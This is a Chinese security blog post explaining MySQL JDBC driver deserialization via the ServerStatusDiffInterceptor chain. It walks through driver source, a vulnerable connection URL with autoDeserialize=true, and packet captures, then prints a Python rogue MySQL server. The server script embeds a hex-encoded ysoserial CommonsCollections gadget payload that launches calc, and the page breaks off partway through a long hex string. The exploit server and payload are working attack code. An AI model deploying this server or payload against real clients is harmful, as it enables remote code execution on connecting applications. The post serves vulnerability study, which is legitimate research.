<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>WebDog必学的JDBC反序列化 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="WebDog必学的JDBC反序列化 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-11T06:05:04.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>11,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">WebDog必学的JDBC反序列化</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1877/#toc_jdbc_1">https://tttang.com/archive/1877/#toc_jdbc_1</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8159#toc-0">https://xz.aliyun.com/t/8159#toc-0</a></p>
<h1 id="一、原理分析"><a href="#一、原理分析" class="headerlink" title="一、原理分析"></a>一、原理分析</h1><h2 id="（1）Java序列化对象的标识符"><a href="#（1）Java序列化对象的标识符" class="headerlink" title="（1）Java序列化对象的标识符"></a>（1）Java序列化对象的标识符</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Car</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Car</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name =<span class="string">&quot;car&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, FileNotFoundException &#123;</span><br><span class="line">        Car car=<span class="keyword">new</span> <span class="title class_">Car</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(car);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行程序输出得到一个序列化文件，看看他的十六进制会发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678442726278-0e516fbb-8b68-40f2-bbbb-15df2b14b403.png#averageHue=%23302e2a&clientId=ud722d3fe-4c45-4&from=paste&height=663&id=u7b2cb424&name=image.png&originHeight=829&originWidth=1893&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100009&status=done&style=none&taskId=u50b08f5e-a697-4da1-bc92-0e61763eeb3&title=&width=1514.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678442736035-008d7142-913f-4e7b-9695-f8ae3888ea2c.png#averageHue=%23413f3c&clientId=ud722d3fe-4c45-4&from=paste&height=465&id=u405a6a9c&name=image.png&originHeight=581&originWidth=2067&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80138&status=done&style=none&taskId=u5e762d51-4ef5-4d0d-a3f8-cc4689bc8c6&title=&width=1653.6" alt="image.png"><br>前两个字节固定为<code>-84</code>和<code>-19</code>，这一点在后面会回收伏笔，我们先记住这一个特性即可</p>
<h2 id="（2）寻找readObject触发点"><a href="#（2）寻找readObject触发点" class="headerlink" title="（2）寻找readObject触发点"></a>（2）寻找readObject触发点</h2><p>直接说结论，漏洞点在于<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code>，我们看看该方法内部：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="built_in">this</span>.checkRowPos();</span><br><span class="line">           <span class="built_in">this</span>.checkColumnBounds(columnIndex);</span><br><span class="line">           <span class="type">int</span> <span class="variable">columnIndexMinusOne</span> <span class="operator">=</span> columnIndex - <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">this</span>.thisRow.getNull(columnIndexMinusOne)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="built_in">this</span>.columnDefinition.getFields()[columnIndexMinusOne];</span><br><span class="line">               <span class="keyword">switch</span> (field.getMysqlType()) &#123;</span><br><span class="line">                   <span class="keyword">case</span> BIT:</span><br><span class="line">                       <span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">                           <span class="keyword">return</span> field.isSingleBit() ? <span class="built_in">this</span>.getBoolean(columnIndex) : <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           <span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                           <span class="keyword">if</span> (!(Boolean)<span class="built_in">this</span>.connection.getPropertySet().getBooleanProperty(<span class="string">&quot;autoDeserialize&quot;</span>).getValue()) &#123;</span><br><span class="line">                               <span class="keyword">return</span> data;</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">                               <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                                   <span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">                                       <span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">                                   &#125;</span><br><span class="line"></span><br><span class="line">                                   <span class="keyword">try</span> &#123;</span><br><span class="line">                                       <span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                                       <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">                                       obj = objIn.readObject();</span><br><span class="line">                                       objIn.close();</span><br><span class="line">                                       bytesIn.close();</span><br><span class="line">                                   &#125; <span class="keyword">catch</span> (ClassNotFoundException var13) &#123;</span><br><span class="line">                                       <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;ResultSet.Class_not_found___91&quot;</span>) + var13.toString() + Messages.getString(<span class="string">&quot;ResultSet._while_reading_serialized_object_92&quot;</span>), <span class="built_in">this</span>.getExceptionInterceptor());</span><br><span class="line">                                   &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                                       obj = data;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line"></span><br><span class="line">                               <span class="keyword">return</span> obj;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678444309757-0d436ab5-37ef-4334-8ce7-42c3782326a7.png#averageHue=%232a2b27&clientId=ued7ce6a7-6313-4&from=paste&height=700&id=u008321f1&name=image.png&originHeight=875&originWidth=2021&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2517019&status=done&style=none&taskId=uf9742600-4467-4920-a20c-21df354a2af&title=&width=1616.8" alt="image.png"><br>在readObject前有一个判断，那就是<code>if (data[0] != -84 || data[1] != -19)</code>,这2个数字熟不熟悉，这个用来判断是否为序列化对象，如果是的话才能进入readObject方法被调用<br>那么哪里又调用了getObject方法呢<br><code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()</code>中调用了，跟进看看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678444421624-54184ec5-b20a-4f5a-81cd-f90d9b83cb1a.png#averageHue=%232c2e2b&clientId=ued7ce6a7-6313-4&from=paste&height=657&id=uc7d522d8&name=image.png&originHeight=821&originWidth=1520&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1721537&status=done&style=none&taskId=ufe6eb9ce-fded-4ac9-a008-2e35571c5fb&title=&width=1216" alt="image.png"><br>执行<code>ResultSetUtil.resultSetToMap(toPopulate, rs);</code>方法，跟进该方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678444450138-58ac6325-6869-456d-aa45-80411de9882a.png#averageHue=%2332332e&clientId=ued7ce6a7-6313-4&from=paste&height=153&id=u692c247d&name=image.png&originHeight=191&originWidth=891&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=247454&status=done&style=none&taskId=u4045fe22-0ba6-41e6-8694-9fbcaffd40d&title=&width=712.8" alt="image.png"><br>在方法内执行了getObject方法，至此闭环，现在需要搞清楚的就是上面的toPopulate和rs究竟是个什么<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678444518349-f0233ec0-aa27-4947-96c8-f7126f04e6ed.png#averageHue=%2332322b&clientId=ued7ce6a7-6313-4&from=paste&height=198&id=u7a8a2c4b&name=image.png&originHeight=248&originWidth=915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=333124&status=done&style=none&taskId=u8f26c81f-0072-4c1a-8a57-23ca3ae008b&title=&width=732" alt="image.png"><br>rs实际上是服务端执行SQL语句<code>SHOW SESSION STATUS</code>后返回的结果，那么这就让我们不由得联想恶意mysql服务端了，如果有这么一个evil mysql，可以控制rs的值，那么可能就可以触发反序列化链了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678444655546-923559a3-16ce-4977-921b-9a295deb1c39.png#averageHue=%232f2f2c&clientId=ued7ce6a7-6313-4&from=paste&height=334&id=u8b3dfc60&name=image.png&originHeight=417&originWidth=1443&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=838151&status=done&style=none&taskId=u1893ad83-1de2-4473-8df5-139e9753bbd&title=&width=1154.4" alt="image.png"><br>并且注意在getObject中要求autoDeserialize需要为true，这也是JDBC URL中为啥要加上true的原因</p>
<h2 id="（3）Mysql认证报文"><a href="#（3）Mysql认证报文" class="headerlink" title="（3）Mysql认证报文"></a>（3）Mysql认证报文</h2><p>先准备一手clinet：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">Driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&amp;serverTimezone=GMT%2B8&quot;</span>;</span><br><span class="line">        Class.forName(Driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;xxxxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用WIreshark抓一手包，过滤条件为<code>tcp.port ==3306 &amp;&amp; mysql</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678445956624-40f0dbf0-5388-4e1f-ab5b-9f5728c01ad9.png#averageHue=%23adfcac&clientId=uac311049-55c2-4&from=paste&height=525&id=u853a3cba&name=image.png&originHeight=656&originWidth=1888&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93420&status=done&style=none&taskId=u4dbf7afa-527c-494e-9e0a-04d831b4ad9&title=&width=1510.4" alt="image.png"><br>不难发现其实mysql也是有类似tcp一样的认证系统的，有Request和Response，简单的看一个Response OK包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678446028902-bd8389fd-eb14-4366-ac06-e0581f666dbc.png#averageHue=%23fcfbfb&clientId=uac311049-55c2-4&from=paste&height=304&id=ue529c81e&name=image.png&originHeight=380&originWidth=1191&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16386&status=done&style=none&taskId=u216afcab-3a38-4254-918f-20a91bfb823&title=&width=952.8" alt="image.png"><br>MYSQL Protocol就是认证报文了为<code>0700000200000002000000</code>，也就是说我们恶意服务端只需要将该数据返回给Request即可完成认证，再看看问候报文：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678446105352-a764bd02-f563-4ef5-bb3a-72d407f99e96.png#averageHue=%23faf9f9&clientId=uac311049-55c2-4&from=paste&height=548&id=u28f1be8c&name=image.png&originHeight=685&originWidth=1509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47173&status=done&style=none&taskId=u33a48446-f0f8-41d6-824c-ca520445560&title=&width=1207.2" alt="image.png"><br>直接发送原始数据即可，恶意服务端可以将这部分改为恶意payload，之后进行反序列化</p>
<h1 id="二、ServerStatusDiffInterceptor链"><a href="#二、ServerStatusDiffInterceptor链" class="headerlink" title="二、ServerStatusDiffInterceptor链"></a>二、ServerStatusDiffInterceptor链</h1><h2 id="（1）8-0-7-8-0-20"><a href="#（1）8-0-7-8-0-20" class="headerlink" title="（1）8.0.7-8.0.20"></a>（1）8.0.7-8.0.20</h2><p>其实上述讲的就是该链，这里我们来分析一下，根据上面的思路备好一个恶意mysql服务端：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/7/27 2:10</span></span><br><span class="line"><span class="comment">#@Author: Tri0mphe7</span></span><br><span class="line"><span class="comment">#@File : server.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a </span></span><br><span class="line">    file= <span class="string">r&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1b